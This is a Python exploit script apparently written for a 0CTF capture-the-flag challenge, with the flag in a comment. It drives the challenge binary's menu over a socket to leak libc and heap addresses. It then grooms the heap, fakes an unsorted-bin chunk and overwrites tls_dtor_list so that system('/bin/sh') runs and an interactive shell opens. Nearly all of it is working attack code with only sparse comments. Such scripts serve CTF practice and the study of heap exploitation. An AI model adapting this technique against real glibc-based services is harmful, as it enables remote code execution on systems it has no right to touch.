#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
#port = 8888

# 0ctf{which_flavor_of_bins_do_u_like_most}
host = "202.120.7.206"
port = 10101

sock = make_conn(host,port)

def insert(sock,data,recv = False):
    if recv :
        recvuntil(sock,":")
        sendline(sock,"1")
        recvuntil(sock,":")
        sendline(sock,str(len(data)+1))
        recvuntil(sock,":")
        sendline(sock,data)
    else :
        sendline(sock,"1")
        sendline(sock,str(len(data)+1))
        sendline(sock,data)


def update(sock,index,data):
    #recvuntil(sock,":")
    sendline(sock,"2")
    #recvuntil(sock,":")
    sendline(sock,str(index))
    #recvuntil(sock,":")
    sendline(sock,str(len(data)+1))
    #recvuntil(sock,":")
    sendline(sock,data)

def merge(sock,index1,index2,recv =False):
    if recv :
        recvuntil(sock,":")
        sendline(sock,"3")
        recvuntil(sock,":")
        sendline(sock,str(index1))
        recvuntil(sock,":")
        sendline(sock,str(index2))
    else :
        sendline(sock,"3")
        sendline(sock,str(index1))
        sendline(sock,str(index2))

def view(sock,index):
    recvuntil(sock,":")
    sendline(sock,"5")
    recvuntil(sock,":")
    sendline(sock,str(index))
    data = recvuntil(sock,"==")
    return data

def dele(sock,index):
    #recvuntil(sock,":")
    sendline(sock,"4")
    #recvuntil(sock,":")
    sendline(sock,str(index))

insert(sock,"ddaa"*4,True) #0
insert(sock,"ddaa"*4,True) #1
insert(sock,"orange"*4,True) #2
insert(sock,"orange"*4,True) #3
insert(sock,"ddaa"*4,True) #4
insert(sock,"orange"*4,True) #5

merge(sock,0,0,True) #6
merge(sock,2,2,True) #0
data =  view(sock,6).split("\n")
libcptr = unpack(data[1][:8])
heapptr = unpack(data[1][8:].ljust(8,"\x00"))
libc = libcptr - 0x3be7b8
heap = heapptr - 0x120

print "libc : ",hex(libc)
print "heap : ",hex(heap)

for i in range(22):
    if i == 15 :
        insert(sock,"A"*0xfd0 + pack(0) + pack(0x2001) + pack(heap) + pack(heap+ 0x120) ) #2
    else :
        insert(sock,chr(ord("a")+i)*0xfff) #2

for i in range(11):
    merge(sock,7+2*i,8+2*i)
for i in range(3):
    merge(sock,7+2*i,8+2*i)
for i in range(2):
    merge(sock,13+2*i,14+2*i)
for i in range(2):
    merge(sock,7+2*i,8+2*i)
merge(sock,7,11)
merge(sock,8,17)
for i in range(22):
    insert(sock,"a"*0xfff) #2
for i in range(11):
    merge(sock,8+2*i,9+2*i)
for i in range(3):
    merge(sock,8+2*i,9+2*i)
for i in range(2):
    merge(sock,13+2*i,14+2*i)
merge(sock,8,9)
merge(sock,10,11)
merge(sock,14,17)
merge(sock,9,18)
merge(sock,8,10)
merge(sock,9,30)
merge(sock,4,4)
merge(sock,7,8) #triger the mmap
system = libc + 0x46640
binsh = libc + 0x17ccdb
insert(sock,"ddaa"*0x10 + pack(system) + pack(binsh)) #insert dtor_list object
insert(sock,"ddaa"*4)
insert(sock,"ddaa"*4)

dele(sock,7)
dele(sock,10)
dele(sock,8)

#fake the unsortbin
update(sock,6,pack(libc + 0x3be7b8) + pack(libc + 0x7e0fe0))
update(sock,9,pack(libc + 0x7e0fe0) + pack(libc + 0x3be7b8))
insert(sock,"g"*0xfff)

tls_dtor_list = heap + 0x50
payload = "a"*0x690  #tls padding
payload += pack(libc + 0x3bf060)
payload = payload.ljust(0x6f0,"a")
payload += pack(tls_dtor_list)
insert(sock,payload)
#recvuntil(sock,":")
sendline(sock,"7")
recvuntil(sock,"Bye")
print "Get shell:"
inter(sock)
